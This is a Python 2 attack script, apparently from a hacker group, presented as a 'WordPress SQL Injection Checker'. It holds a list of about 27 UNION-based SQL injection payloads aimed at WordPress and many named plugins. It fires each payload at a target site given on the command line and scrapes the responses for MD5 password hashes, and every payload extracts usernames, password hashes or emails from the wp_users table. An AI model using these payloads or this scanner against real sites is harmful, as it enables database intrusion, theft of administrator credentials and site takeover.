#!/usr/bin/python
#WordPress SQL Injection Checker v1
#for md5's in the source will use 
#http responses. 
#       __  __         ___      ___
#___   __ \/ /______   __ \_____  /
#__ | / /_  /_  ___/  / / /  __  / 
#__ |/ /_  / / /__ / /_/ // /_/ /  
#_____/ /_/  \___/ \____/ \__,_/   
#   http://www.vyc0d.uni.cc
#  vyc0d[at]hackermail[dot]com

import sys, urllib2, re, time, httplib

#Bad HTTP Responses 
BAD_RESP = [400,401,404]

def main(path):
	try:
		h = httplib.HTTP(host.split("/",1)[0])
		h.putrequest("HEAD", "/"+host.split("/",1)[1]+path)
		h.putheader("Host", host.split("/",1)[0])
		h.endheaders()
		resp, reason, headers = h.getreply()
		return resp, reason, headers.get("Server")
	except(), msg: 
		print "Error Occurred:",msg
		pass

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

print "\n\t WP SQL Injection Checker v1"
print "\t-----------------------------"
print "\t     vYc0d - M0slem Hax0r"

sqls = ["index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*",
	"index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*",
	"index.php?exact=1&sentence=1&s=%b3%27)))/**/AND/**/ID=-1/**/UNION/**SELECT**/1,2,3,4,5,user_pass,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/**/FROM/**/wp_users%23",
	"index?page_id=115&forumaction=showprofile&user=1+union+select+null,concat(user_login,0x2f,user_pass,0x2f,user_email),null,null,null,null,null+from+wp_tbv_users/*",
	"wp-content/plugins/wp-cal/functions/editevent.php?id=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6%20from%20wp_users--",
	"wp-content/plugins/fgallery/fim_rss.php?album=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6,7%20from%20wp_users--",
	"wp-content/plugins/wassup/spy.php?to_date=-1%20group%20by%20id%20union%20select%20null,null,null,conca(0x7c,user_login,0x7c,user_pass,0x7c),null,null,null,null,null,null,null,null%20%20from%20wp_users",
	"wordspew-rss.php?id=-998877/**/UNION/**/SELECT/**/0,1,concat(0x7c,user_login,0x7c,user_pass,0x7c),concat(0x7c,user_login,0x7c,user_pass,0x7c),4,5/**/FROM/**/wp_users",
	"wp-content/plugins/st_newsletter/shiftthis-preview.php?newsletter=-1/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users",
	"sf-forum?forum=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	"sf-forum?forum=-99999/**/UNION/**/SELECT/**/0,concat(0x7c,user_login,0x7c,user_pass,0x7c),0,0,0,0,0/**/FROM/**/wp_users/*",
	"forums?forum=1&topic=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	"index?page_id=2&album=S@BUN&photo=-333333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/from%2F%2A%2A%2Fwp_users/**WHERE%20admin%201=%201",
	"wp-download.php?dl_id=null/**/union/**/all/**/select/**/concat(user_login,0x3a,user_pass)/**/from/**/wp_users/*",
	"wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain",
	"wp-content/plugins/nextgen-smooth-gallery/nggSmoothFrame.php?galleryID=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	"myLDlinker.php?url=-2/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	"?page_id=2/&forum=all&value=9999+union+select+(select+concat_ws(0x3a,user_login,user_pass)+from+wp_users+LIMIT+0,1)--+&type=9&search=1&searchpage=2",
	"wp-content/themes/limon/cplphoto.php?postid=-2+and+1=1+union+all+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11,12+from+wp_users--&id=2",
	"?event_id=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	"wp-content/plugins/photoracer/viewimg.php?id=-99999+union+select+0,1,2,3,4,user(),6,7,8/*",
	"?page_id=2&id=-999+union+all+select+1,2,3,4,group_concat(user_login,0x3a,user_pass,0x3a,user_email),6+from+wp_users/*",
	"wp-content/plugins/wp-forum/forum_feed.php?thread=-99999+union+select+1,2,3,concat(user_login,0x2f,user_pass,0x2f,user_email),5,6,7+from+wp_users/*",
	"mediaHolder.php?id=-9999/**/UNION/**/SELECT/**/concat(User(),char(58),Version()),2,3,4,5,6,Database()--",
	"wp-content/plugins/st_newsletter/stnl_iframe.php?newsletter=-9999+UNION+SELECT+concat(user_login,0x3a,user_pass,0x3a,user_email)+FROM+wp_users--",
	"wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain",
	"wp-download.php?dl_id=null/**/union/**/all/**/select/**/concat(user_login,0x3a,user_pass)/**/from/**/wp_users/*"]

if len(sys.argv) != 2:
	print "\nUsage: ./wpsqli.py <site>"
	print "Example: ./wpsqli.py www.site.com/\n"
	sys.exit(1)

host = sys.argv[1].replace("http://","").rsplit("/",1)[0]
if host[-1] != "/":
	host = host+"/"
	
print "\n[!] Site:",host
print "[!] SQL Loaded:",len(sqls) 

server = main("/")[2]
print "[!] Server:",server

print "\n[!] Started:",timer()

print "\n[!] Scanning: SQL\n"
for sql in sqls:
	time.sleep(2)
	print "[+] Trying:",sql.replace("\n","")
	try:
		source = urllib2.urlopen("http://"+host+sql.replace("\n","")).read()
		md5s = re.findall("[a-f0-9]"*32,source)
		if len(md5s) >= 1:
			print "[!]",host+sql.replace("\n","")
			for md5 in md5s:
				print "\n\t[!]Hash to MD5:",md5
	except(urllib2.HTTPError):
		pass
print "\n[-] Done\n"
